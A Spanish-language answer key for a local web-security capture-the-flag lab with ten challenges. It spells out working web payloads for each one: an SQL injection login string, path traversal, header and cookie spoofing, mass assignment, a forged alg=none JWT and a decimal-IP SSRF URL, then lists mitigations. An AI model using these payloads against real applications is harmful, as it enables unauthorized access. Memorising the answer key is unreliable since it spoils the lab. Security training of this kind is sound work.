# Soluciones del laboratorio — SPOILERS

**No abras este archivo hasta que hayas intentado los diez retos.** Las flags son aleatorias y se regeneran cada vez que arranca el servidor: debes obtenerlas de las respuestas HTTP reales.

Los ejemplos siguientes son *solo* para el contenedor local del laboratorio.

## 01 · IDOR

En Burp Repeater cambia el ID en la URL:

```http
GET /api/basic/invoices?id=4102 HTTP/1.1
Host: 127.0.0.1:8000
```

La respuesta contiene `document.detail` con la flag.

## 02 · Manipulación de precio

Intercepta el `POST /api/basic/checkout` y cambia `unit_price` de 12990 a 0:

```json
{"sku":"KIT-CTF","quantity":1,"unit_price":0}
```

## 03 · Cookie de administrador

Intercepta `GET /api/basic/staff`. Conserva `lab_session` y agrega una cookie:

```http
Cookie: lab_session=TU_ID_ACTUAL; lab_role=admin
```

## 04 · SQL Injection

Intercepta `POST /api/medium/login` e introduce el siguiente usuario:

```json
{"username":"admin' -- ","password":"cualquiera"}
```

Después consulta `GET /api/medium/portal` **con la misma cookie de sesión**.

## 05 · Path Traversal virtual

Usa `GET /api/medium/files?name=../../internal/key.txt` (es válido codificar los caracteres especiales). Empieza en `/public/docs` y alcanza `/internal/key.txt`, un archivo ficticio en memoria.

## 06 · Encabezado de IP

En `GET /api/medium/internal`, agrega:

```http
X-Forwarded-For: 127.0.0.1
```

## 07 · Método HTTP

A la solicitud `GET /api/medium/records`, cámbiale el método a `POST` desde Repeater. No requiere cuerpo.

## 08 · Mass Assignment

1. Crea una solicitud con `POST /api/expert/requests` y copia su `request_id`.
2. Envía `PATCH /api/expert/requests/EX-...` con este JSON:

```json
{"comment":"Actualización","state":"approved","scope":"restricted","approved_by":"audit-bot"}
```

3. Solicita `GET /api/expert/export?request_id=EX-...` usando la misma sesión.

## 09 · JWT alg=none

1. `GET /api/expert/token` entrega un JWT de lectura.
2. En Burp Decoder, codifica en Base64URL **sin padding** el encabezado `{"typ":"JWT","alg":"none"}` y el payload `{"sub":"visitante","role":"admin"}`.
3. Concatena con punto, dejando la firma vacía: `<base64url(header)>.<base64url(payload)>.`
4. En `GET /api/expert/vault` usa `Authorization: Bearer TOKEN_FORJADO`.

No se necesita conocer la clave secreta por la validación incorrecta de `none`.

## 10 · SSRF simulada

Intercepta `POST /api/expert/preview` y envía:

```json
{"url":"http://2130706433/internal/flag"}
```

`2130706433` equivale a `127.0.0.1` en representación decimal entera. El filtro solo reconoce ciertas cadenas, pero el simulador normaliza la dirección al destino interno. **No se realiza ninguna conexión de red real a esa URL.**

---

## Mitigaciones clave

- 01: comprobar el propietario del recurso en el backend para *cada* ID.
- 02: recalcular todos los precios en el servidor desde un catálogo confiable.
- 03: usar sesiones del lado del servidor o cookies autenticadas y firmadas.
- 04: consultas SQL parametrizadas.
- 05: impedir que una ruta escape del directorio permitido.
- 06: confiar en headers de proxy solo cuando los establece un proxy inverso controlado.
- 07: aplicar autorización uniformemente en todos los métodos.
- 08: definir listas de campos que pueden actualizarse, especialmente para estados de aprobación.
- 09: exigir un algoritmo criptográfico definido por el servidor y validar la firma.
- 10: resolver y comprobar IPs/hosts normalizados, bloquear destinos internos y revisar redirecciones.
